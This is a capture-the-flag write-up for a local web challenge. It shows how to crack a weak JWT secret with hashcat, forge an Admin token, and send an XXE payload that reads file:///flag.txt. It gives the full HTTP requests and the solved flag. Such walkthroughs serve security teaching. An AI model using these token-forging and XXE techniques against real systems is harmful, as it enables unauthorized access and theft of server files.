# Breaking & Entitying Writeup

This challenge involves exploiting 2 vulnerabilities. The first of these is a weak secret used when signing JWTs. The second is XXE (XML External Entity injection).

## Exploiting the JWT

Once logged in, use the browser developer tools to check what cookies have been assigned. This reveals there is a `token` cookie which is a JWT.

![The JWT set by the website](./images/cookie_shown.png)

Decoding this reveals there is a field for the name and the username, both of which are set to `Goose`.

For example, using [jwt.io](https://www.jwt.io/):

![The decoded JWT](./images/decode_jwt.png)

The signing key can be cracked using `hashcat` as follows (where jwt.txt contains the JWT):

```
hashcat -a 0 -m 16500 jwt.txt /path/to/wordlist.txt 
```

Followed by

```
hashcat -a 0 -m 16500 jwt.txt /path/to/wordlist.txt --show
```

This reveals the secret to be `sillygoose`.

The JWT can then be forged to contain the username 'Admin' as required to be able to use the `Get account details` feature.

Again, this can be done with [jwt.io](https://www.jwt.io/):

![The JWT for the Admin user](./images/jwt_encode.png)

If you replace the stored `token` cookie with this new value and refresh the home page, it will display that your username is now `Admin`.

![The homepage displaying that the username is Admin](./images/auth_as_admin.png)

The `Get account details` button now works and will generate a PDF which displays the name and username.

![The PDF generated for the Admin user](./images/normal_pdf.png)

## Exploiting XXE

Requests sent to the server to generate the PDF are as follows:

```
POST /account HTTP/1.1
Host: 127.0.0.1:5000
Content-Length: 86
[... irrelevant headers removed ...]
Content-Type: application/xml
[... irrelevant headers removed ...]
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkFkbWluIiwibmFtZSI6Ikdvb3NlIn0.VCnfXgh3aHImc-xkXriRj8Sx9X3t6cZ6-ZGylooRJ0I
Connection: keep-alive

<?xml version="1.0"?>
<data>
  <username>Admin</username>
  <name>Goose</name>
</data>
```

This reveals that the name and username are sent to the server with XML which is presumably to pass these values so they get displayed in the PDF.

If you intercept this request in `Burp Suite` and modify it before forwarding it to the server, you can exploit the XXE vulnerability to include the flag file rather than the name. The modified request is as follows:

```
POST /account HTTP/1.1
Host: 127.0.0.1:5000
Content-Length: 86
[... irrelevant headers removed ...]
Content-Type: application/xml
[... irrelevant headers removed ...]
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkFkbWluIiwibmFtZSI6Ikdvb3NlIn0.VCnfXgh3aHImc-xkXriRj8Sx9X3t6cZ6-ZGylooRJ0I
Connection: keep-alive

<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<data>
  <username>Admin</username>
  <name>&xxe;</name>
</data>
```

This generates a PDF with the flag as the name:

![The generated PDF containing a flag](./images/hacked_pdf.png)

The flag is therefore the displayed name: `GooseCTF{Silly_G0ose}`.